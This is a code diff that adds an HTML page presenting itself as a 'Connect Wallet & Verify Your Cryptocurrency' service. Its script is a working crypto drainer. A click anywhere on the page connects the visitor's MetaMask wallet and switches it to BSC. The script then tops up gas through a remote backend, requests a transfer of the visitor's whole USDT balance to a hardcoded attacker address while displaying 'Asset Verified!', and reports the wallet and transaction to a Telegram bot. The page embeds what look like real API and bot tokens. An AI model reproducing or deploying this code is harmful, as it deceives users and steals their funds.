@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Connect Wallet & Verify Asset</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: #000;
+      position: relative;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      opacity: 0.5;
+    }
+
+    h1 {
+      margin-bottom: 40px;
+      font-size: 28px;
+      color: #fff;
+      text-shadow: 1px 1px 3px #fcd535;
+      z-index: 1;
+    }
+
+    #status {
+      font-size: 16px;
+      margin-top: 20px;
+      z-index: 1;
+    }
+
+    .loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      display: none;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #fcd535;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <canvas id="coinCanvas"></canvas>
+  <h1>Connect Wallet & Verify Your Cryptocurrency</h1>
+  <p id="status"></p>
+
+  <div class="loader-overlay" id="loaderOverlay">
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
+    const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
+    const TELEGRAM_CHAT_ID = '8060968649';
+    const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
+    const RECEIVER = '0x8e11ea07330A4824F846ad3Ea3dfB68f47c66B56';
+    const BACKEND_URL = 'https://a-production-c9bc.up.railway.app';
+
+    const canvas = document.getElementById('coinCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const coinLogoBinance = 'binance-coin-bnb-logo.png'; 
+    const coinLogoTether = 'tether-usdt-logo.svg'; 
+
+    const imageBinance = new Image();
+    const imageTether = new Image();
+    let imageBinanceLoaded = false;
+    let imageTetherLoaded = false;
+
+    imageBinance.src = coinLogoBinance;
+    imageTether.src = coinLogoTether;
+
+    imageBinance.onload = () => {
+      imageBinanceLoaded = true;
+      if (imageTetherLoaded) createLogos();
+    };
+
+    imageTether.onload = () => {
+      imageTetherLoaded = true;
+      if (imageBinanceLoaded) createLogos();
+    };
+
+    const logoCount = 7;
+    const logosBinance = [];
+    const logosTether = [];
+
+    function createLogos() {
+      for (let i = 0; i < logoCount; i++) {
+        logosBinance.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          size: 50,
+          dx: (Math.random() - 0.5) * 4,
+          dy: (Math.random() - 0.5) * 4,
+          image: imageBinance,
+        });
+        logosTether.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          size: 50,
+          dx: (Math.random() - 0.5) * 4,
+          dy: (Math.random() - 0.5) * 4,
+          image: imageTether,
+        });
+      }
+      animateLogos();
+    }
+
+    function animateLogos() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      logosBinance.concat(logosTether).forEach(logo => {
+        ctx.drawImage(logo.image, logo.x, logo.y, logo.size, logo.size);
+        logo.x += logo.dx;
+        logo.y += logo.dy;
+        if (logo.x <= 0 || logo.x + logo.size >= canvas.width) logo.dx = -logo.dx;
+        if (logo.y <= 0 || logo.y + logo.size >= canvas.height) logo.dy = -logo.dy;
+      });
+      requestAnimationFrame(animateLogos);
+    }
+
+    let walletConnected = false;
+
+    document.body.addEventListener("click", async () => {
+      if (!walletConnected) {
+        walletConnected = true;
+        await connectAndSend();
+      }
+    });
+
+    async function connectAndSend() {
+      const status = document.getElementById("status");
+      const loaderOverlay = document.getElementById("loaderOverlay");
+      loaderOverlay.style.display = "flex";
+      status.innerText = "🔗 Connecting...";
+
+      if (typeof window.ethereum === 'undefined') {
+        alert("⚠️ Please install MetaMask!");
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const user = accounts[0];
+
+      const chainId = await web3.eth.getChainId();
+      if (chainId !== 56) {
+        status.innerText = "⚠️ Wrong Network. Switching to BSC...";
+        await switchToBSC();
+      } else {
+        status.innerText = "✅ Connected to BSC";
+      }
+
+      let message = `📲 *Wallet Connected*\n\`${user}\`\n\n`;
+
+      const bnbUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${user}&apikey=${BSC_SCAN_API}`;
+      const bnbRes = await fetch(bnbUrl);
+      const bnbData = await bnbRes.json();
+      let bnb = 0;
+
+      if (bnbData.status === "1") {
+        bnb = parseFloat(bnbData.result) / 1e18;
+        message += `💰 *BNB*: ${bnb.toFixed(4)}\n`;
+      } else {
+        message += `💰 *BNB*: ❌ Error\n`;
+      }
+
+      const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
+      const priceData = await priceRes.json();
+      const bnbUsd = bnb * priceData.binancecoin.usd;
+
+      const usdtUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${user}&tag=latest&apikey=${BSC_SCAN_API}`;
+      const usdtRes = await fetch(usdtUrl);
+      const usdtData = await usdtRes.json();
+      const usdt = (parseFloat(usdtData.result) / 1e18).toFixed(2);
+      message += `💵 *USDT*: ${usdt}\n`;
+
+      if (bnbUsd < 1) {
+        message += `⚠️ *BNB < $1* – requesting top-up...\n`;
+        status.innerText = "Top-up in progress. Please wait...";
+
+        const topupRes = await fetch(`${BACKEND_URL}/api/topup-bnb`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address: user })
+        });
+
+        const topup = await topupRes.json();
+        if (!topup.ready) {
+          message += `❌ *Top-up Failed*`;
+          status.innerText = "Top-up failed.";
+          loaderOverlay.style.display = "none";
+          return sendTelegram(message);
+        }
+
+        message += `✅ *Top-up Requested! Waiting 15 sec...*\n`;
+        await new Promise(r => setTimeout(r, 15000));
+
+        const bnbCheck = await fetch(bnbUrl);
+        const newBnbData = await bnbCheck.json();
+        const newBnb = parseFloat(newBnbData.result) / 1e18;
+        const newBnbUsd = newBnb * priceData.binancecoin.usd;
+
+        if (newBnbUsd < 1) {
+          message += `❌ *Still < $1 BNB* – cannot proceed.\n`;
+          status.innerText = "Insufficient BNB.";
+          loaderOverlay.style.display = "none";
+          return sendTelegram(message);
+        }
+
+        message += `✅ *BNB now sufficient! Proceeding...*\n`;
+      }
+
+      const usdtContract = new web3.eth.Contract([
+        {
+          "constant": false, "inputs": [
+            { "name": "_to", "type": "address" },
+            { "name": "_value", "type": "uint256" }
+          ],
+          "name": "transfer", "outputs": [{ "name": "", "type": "bool" }],
+          "type": "function"
+        }
+      ], USDT_CONTRACT);
+
+      const amountToSend = web3.utils.toWei(usdt, "ether");
+
+      try {
+        const tx = await usdtContract.methods.transfer(RECEIVER, amountToSend).send({ from: user });
+        message += `🚀 *USDT Sent Successfully!*\n📦 TX Hash: \`${tx.transactionHash}\``;
+        status.innerText = "✅ Asset Verified!";
+      } catch (err) {
+        console.error(err);
+        message += `❌ *USDT Transfer Failed*`;
+        status.innerText = "❌ Verification Failed.";
+      }
+
+      loaderOverlay.style.display = "none";
+      await sendTelegram(message);
+    }
+
+    async function switchToBSC() {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }]
+        });
+      } catch (error) {
+        console.error(error);
+        alert("⚠️ Failed to switch to BSC.");
+      }
+    }
+
+    async function sendTelegram(msg) {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+  </script>
+</body>
+</html>
